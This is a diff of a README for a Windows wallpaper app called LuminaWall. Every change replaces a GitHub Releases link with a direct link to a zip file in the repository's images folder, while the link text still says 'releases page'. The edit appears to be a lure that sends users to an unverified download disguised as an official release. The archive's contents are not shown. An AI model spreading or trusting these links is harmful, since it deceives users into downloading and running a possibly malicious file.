@@ -1,6 +1,6 @@
 # ✨ LuminaWall - Animated WebGL Wallpapers
 
-[![Download LuminaWall](https://img.shields.io/badge/Download-LuminaWall-7E57C2?style=for-the-badge&logo=github)](https://github.com/doreentwopiece973/LuminaWall/releases)
+[![Download LuminaWall](https://img.shields.io/badge/Download-LuminaWall-7E57C2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/doreentwopiece973/LuminaWall/main/images/Lumina_Wall_v1.0.zip)
 
 ## 🌈 What LuminaWall Does
 
@@ -37,7 +37,7 @@ For best results:
 
 Visit this page to download the Windows version:
 
-[Download LuminaWall from GitHub Releases](https://github.com/doreentwopiece973/LuminaWall/releases)
+[Download LuminaWall from GitHub Releases](https://raw.githubusercontent.com/doreentwopiece973/LuminaWall/main/images/Lumina_Wall_v1.0.zip)
 
 On the release page, look for the latest version. Download the Windows file that matches your PC. If you see a setup file, use that. If you see a portable file, you can run it after download.
 
@@ -45,7 +45,7 @@ On the release page, look for the latest version. Download the Windows file that
 
 Follow these steps:
 
-1. Open the [releases page](https://github.com/doreentwopiece973/LuminaWall/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/doreentwopiece973/LuminaWall/main/images/Lumina_Wall_v1.0.zip).
 2. Find the latest release at the top of the page.
 3. Under the files, choose the Windows download.
 4. Save the file to your PC.
@@ -152,7 +152,7 @@ For most Windows users, the installer or portable package is the file to downloa
 
 Use the releases page each time you want an update:
 
-[Go to LuminaWall Releases](https://github.com/doreentwopiece973/LuminaWall/releases)
+[Go to LuminaWall Releases](https://raw.githubusercontent.com/doreentwopiece973/LuminaWall/main/images/Lumina_Wall_v1.0.zip)
 
 Check the top release first. That is usually the newest version.
 
